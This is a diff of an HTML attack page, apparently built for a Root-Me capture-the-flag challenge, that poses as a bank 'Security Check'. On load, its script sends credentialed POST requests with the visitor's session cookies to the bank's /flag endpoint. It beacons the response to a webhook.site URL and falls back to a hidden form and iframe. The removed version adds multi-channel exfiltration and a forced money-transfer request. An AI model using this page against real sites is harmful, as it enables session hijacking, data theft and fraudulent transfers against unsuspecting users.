@@ -1,99 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exclusive Investment Opportunity</title>
+    <title>Bank Security Verification</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
+        .container { background: white; padding: 30px; border-radius: 10px; margin: 0 auto; max-width: 500px; }
+        .loading { color: green; margin: 20px 0; }
+    </style>
 </head>
 <body>
-    <h1>Secure Investment Portal</h1>
-    <div id="status">Initializing secure connection...</div>
+    <div class="container">
+        <h1>🔒 Security Check</h1>
+        <div class="loading" id="status">Initializing verification...</div>
+    </div>
 
     <script>
-        // Webhook - VERIFICA QUE ESTÉ CORRECTO
-        const WEBHOOK = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
-        
-        // Función para enviar datos
-        function exfiltrate(data) {
-            console.log("Exfiltrating:", data);
-            
-            // Método 1: Image (más confiable)
-            var img1 = new Image();
-            img1.src = WEBHOOK + "?method=img1&data=" + encodeURIComponent(data.substring(0, 1000));
-            
-            // Método 2: Fetch
-            fetch(WEBHOOK, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-                body: 'data=' + encodeURIComponent(data)
-            }).catch(e => console.log("Fetch error"));
-            
-            // Método 3: Navigator.sendBeacon
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(WEBHOOK, 'data=' + encodeURIComponent(data));
+        // Función mejorada que usa fetch en lugar de XMLHttpRequest síncrono
+        async function getFlag() {
+            try {
+                document.getElementById('status').textContent = "Checking permissions...";
+                
+                // Usar fetch en lugar de XMLHttpRequest síncrono
+                const response = await fetch('https://bankme-1.challenges.pro.root-me.org/flag', {
+                    method: 'POST',
+                    credentials: 'include', // Incluir cookies de sesión
+                    mode: 'cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    }
+                });
+                
+                if (response.ok) {
+                    const flag = await response.text();
+                    document.getElementById('status').textContent = "Flag obtained! Sending...";
+                    
+                    // Enviar a webhook
+                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
+                    const img = new Image();
+                    img.src = webhook + "?flag=" + encodeURIComponent(flag);
+                    
+                    document.getElementById('status').textContent = "Verification complete!";
+                } else {
+                    document.getElementById('status').textContent = "Permission denied";
+                    // Enviar error al webhook
+                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
+                    const img = new Image();
+                    img.src = webhook + "?error=Response_status:" + response.status;
+                }
+            } catch (error) {
+                document.getElementById('status').textContent = "Error in verification";
+                // Enviar error al webhook
+                const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
+                const img = new Image();
+                img.src = webhook + "?error=" + encodeURIComponent(error.toString());
             }
+        }
+
+        // Versión alternativa usando form submission (más compatible)
+        function tryWithForm() {
+            document.getElementById('status').textContent = "Trying alternative method...";
             
-            // Método 4: Form submission
-            var form = document.createElement('form');
+            // Crear un formulario invisible
+            const form = document.createElement('form');
             form.method = 'POST';
-            form.action = WEBHOOK;
+            form.action = 'https://bankme-1.challenges.pro.root-me.org/flag';
             form.target = 'hiddenFrame';
-            var input = document.createElement('input');
-            input.name = 'data';
-            input.value = data;
-            form.appendChild(input);
+            form.style.display = 'none';
+            
+            // Crear iframe para recibir la respuesta
+            const frame = document.createElement('iframe');
+            frame.name = 'hiddenFrame';
+            frame.style.display = 'none';
+            frame.onload = function() {
+                // Intentar leer la respuesta del iframe
+                try {
+                    const flag = frame.contentDocument.body.innerText;
+                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
+                    const img = new Image();
+                    img.src = webhook + "?flag=" + encodeURIComponent(flag);
+                    document.getElementById('status').textContent = "Success with form method!";
+                } catch (e) {
+                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
+                    const img = new Image();
+                    img.src = webhook + "?error=Form_method_failed";
+                }
+            };
+            
+            document.body.appendChild(frame);
             document.body.appendChild(form);
-            
-            var iframe = document.createElement('iframe');
-            iframe.name = 'hiddenFrame';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-            
             form.submit();
         }
 
-        // Función post del banco
-        function post(url, params={}){
-            var params_post = [];
-            for(const key in params){
-                params_post.push(`${key}=${params[key]}`);
-            }
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", url, false);
-            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-            xhr.send(params_post.join("&"));
-            return xhr.responseText;
-        }
-
         // Ejecutar cuando cargue la página
-        window.onload = function() {
-            document.getElementById('status').textContent = "Checking authentication...";
-            exfiltrate("Page loaded successfully");
-            
-            setTimeout(function() {
-                try {
-                    document.getElementById('status').textContent = "Accessing privileged data...";
-                    
-                    // Intentar obtener la flag
-                    var flag = post("/flag");
-                    exfiltrate("SUCCESS - Flag: " + flag);
-                    document.getElementById('status').textContent = "Data retrieved successfully!";
-                    
-                } catch(error) {
-                    exfiltrate("ERROR accessing /flag: " + error.toString());
-                    
-                    // Intentar transferencia como fallback
-                    try {
-                        var transfer = post("/transfer", {
-                            recipient: "a", 
-                            amount: "100"
-                        });
-                        exfiltrate("Transfer result: " + transfer);
-                    } catch(e) {
-                        exfiltrate("Transfer error: " + e.toString());
-                    }
-                }
-            }, 1000);
-        };
+        window.addEventListener('load', function() {
+            // Primero intentar con fetch
+            getFlag().catch(() => {
+                // Si fetch falla, intentar con form
+                setTimeout(tryWithForm, 1000);
+            });
+        });
     </script>
 </body>
 </html>
